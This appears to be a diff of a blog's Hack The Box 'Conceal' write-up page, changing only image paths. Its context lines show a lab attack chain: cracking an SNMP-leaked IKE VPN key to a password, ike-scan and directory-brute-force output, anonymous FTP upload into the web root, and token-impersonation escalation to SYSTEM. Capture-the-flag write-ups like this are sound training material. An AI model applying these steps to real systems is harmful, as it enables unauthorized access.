@@ -347,7 +347,7 @@ DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (16739) 0:02:47.39
 SNMPv2-MIB::sysContact.0 = STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43
 SNMPv2-MIB::sysName.0 = STRING: Conceal
 ...
-</code></pre><h2 id=footholduser>Foothold/User</h2><ul><li>We have an interesting entry <code>STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43</code><ul><li>Cracking it results in: <code>Dudecake1!</code></li></ul></li></ul><p><img src=./images/1.png></p><ul><li>We also saw port <code>500</code><ul><li><a href=https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting#finding-a-valid-transformation target=_blank rel=noopener>https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting#finding-a-valid-transformation</a></li></ul></li></ul><pre tabindex=0><code>└─$ ike-scan -M 10.10.10.116                                
+</code></pre><h2 id=footholduser>Foothold/User</h2><ul><li>We have an interesting entry <code>STRING: IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43</code><ul><li>Cracking it results in: <code>Dudecake1!</code></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/conceal/images/1.png></p><ul><li>We also saw port <code>500</code><ul><li><a href=https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting#finding-a-valid-transformation target=_blank rel=noopener>https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting#finding-a-valid-transformation</a></li></ul></li></ul><pre tabindex=0><code>└─$ ike-scan -M 10.10.10.116                                
 Starting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
 10.10.10.116    Main Mode Handshake returned
         HDR=(CKY-R=890d2a52350b91e4)
@@ -433,7 +433,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 25.26 seconds
-</code></pre><ul><li>Web server</li></ul><p><img src=./images/2.png></p><ul><li><code>gobuster</code> and <code>feroxbuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.116/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  --no-error 
+</code></pre><ul><li>Web server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/windows/conceal/images/2.png></p><ul><li><code>gobuster</code> and <code>feroxbuster</code></li></ul><pre tabindex=0><code>└─$ gobuster dir -u http://10.10.10.116/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  --no-error 
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -474,7 +474,7 @@ by Ben &#34;epi&#34; Risher 🤓                 ver: 2.10.0
 301      GET        2l       10w      150c http://10.10.10.116/upload =&gt; http://10.10.10.116/upload/
 200      GET      359l     2112w   178556c http://10.10.10.116/iisstart.png
 200      GET       32l       54w      696c http://10.10.10.116/
-</code></pre><p><img src=./images/3.png></p><ul><li><code>ftp</code><ul><li>It&rsquo;s empty, but we can upload files</li><li>The <code>ftp</code> is pointed to <code>/upload</code></li></ul></li></ul><pre tabindex=0><code>└─$ ftp anonymous@10.10.10.116                                                                                              
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/conceal/images/3.png></p><ul><li><code>ftp</code><ul><li>It&rsquo;s empty, but we can upload files</li><li>The <code>ftp</code> is pointed to <code>/upload</code></li></ul></li></ul><pre tabindex=0><code>└─$ ftp anonymous@10.10.10.116                                                                                              
 Connected to 10.10.10.116.
 220 Microsoft FTP Service
 331 Anonymous access allowed, send identity (e-mail name) as password.
@@ -534,7 +534,7 @@ Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
 
 [+] CreateProcessWithTokenW OK
-</code></pre><p><img src=./images/9.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><p><img src=/posts/cybersecurity/hackthebox/machines/windows/conceal/images/9.png></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fconceal%2f&text=%5bHTB%5d%20Machine%3a%20Conceal&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fconceal%2f&title=%5bHTB%5d%20Machine%3a%20Conceal" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2fwindows%2fconceal%2f&title=%5bHTB%5d%20Machine%3a%20Conceal" target=_blank><i class="fab fa-linkedin"></i>
